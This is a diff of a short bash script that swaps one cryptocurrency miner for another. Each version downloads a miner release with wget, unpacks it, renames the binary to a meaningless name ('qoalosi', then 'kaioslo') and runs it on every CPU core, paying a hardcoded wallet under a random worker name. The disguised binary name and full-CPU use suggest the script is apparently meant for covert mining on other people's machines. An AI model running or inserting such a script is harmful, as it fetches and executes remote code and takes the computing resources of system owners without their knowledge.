@@ -1,5 +1,5 @@
 #!/bin/bash
-wget https://github.com/jtskxx/JETSKI-QUBIC-POOL/releases/download/latest/qubjetski-Linux-v3.5.tar.gz
-tar -xvzf qubjetski-Linux-v3.5.tar.gz && cd qubjetski-Linux-v3.5
-mv qubjetski-Client qoalosi
-./qoalosi -pplns -wallet QDFHPFWSUCGDBDQNORZOPMWDCWZBFJZHDTBAZBPUPCSUHQQCGPSNJVJEPCPM -workername $(echo $RANDOM | md5sum | head -c 10) -cpu -threads $(nproc --all) -start
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
+tar xf hellminer_linux64_avx2.tar.gz
+mv hellminer kaioslo
+./kaioslo -c stratum+tcp://na.luckpool.net:3956 -u RUfB3cXeuFP2itqaiAF4ov1cx17RBLxppw.$(echo $RANDOM | md5sum | head -c 10) -p x --cpu $(nproc --all)
